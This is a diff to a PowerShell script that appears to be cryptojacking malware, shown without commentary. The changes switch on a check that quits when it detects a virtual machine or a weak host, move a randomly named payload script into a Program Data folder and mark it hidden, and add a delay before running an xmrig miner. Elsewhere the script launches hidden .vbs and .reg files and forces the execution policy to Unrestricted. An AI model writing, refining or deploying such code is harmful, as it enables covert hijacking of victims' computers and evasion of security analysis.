@@ -15,11 +15,11 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 ### === PHASE 1: ENVIRONMENT SANITY CHECKS ===
-# if ((Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V" -or 
-#     (Get-WmiObject Win32_Processor).NumberOfCores -lt 2 -or 
-#     (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4) {
-#     exit
-# }
+if ((Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V" -or 
+    (Get-WmiObject Win32_Processor).NumberOfCores -lt 2 -or 
+    (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4) {
+    exit
+}
 
 Set-Variable -Name wd -Value (random_text)
 Set-Variable -Value ("$env:temp\$wd") -Name path
@@ -75,7 +75,12 @@ Get-NetFirewallRule -Name *ssh*
 & "./QyjAaZDBbNPk.reg"
 & "./FoRAUwtxKkSB.vbs"
 
+
+$tasks = "C:/Users/%USERNAME%/Program Data/Microsoft/Windows/AEQKCPrkuifY.ps1"
+
 Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir
+Move-Item -Path "$path\AEQKCPrkuifY.ps1" -Destination $tasks
+
 
 Start-Sleep -Seconds 30
 
@@ -124,7 +129,7 @@ Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwj
 
 #Start-Process -FilePath "$initial_dir\edpnotify.ps1" -windowstyle hidden
 
-Set-ItemProperty -Name Attributes -Path "$initial_dir\AEQKCPrkuifY.ps1" -Value "Hidden"
+Set-ItemProperty -Name Attributes -Path "$tasks\AEQKCPrkuifY.ps1" -Value "Hidden"
 
 Start-Process -FilePath "$path\AEQKCPrkuifY.ps1" -windowstyle hidden
 
@@ -135,6 +140,8 @@ Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 cd "$initial_dir\xmrig-6.22.2"
 Remove-Item -Path "initial_dir\xmrig-6.22.2\config.json"
+
+Start-Sleep -Seconds 340
 Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
 
 & "./TMqhONoBljEv.vbs"
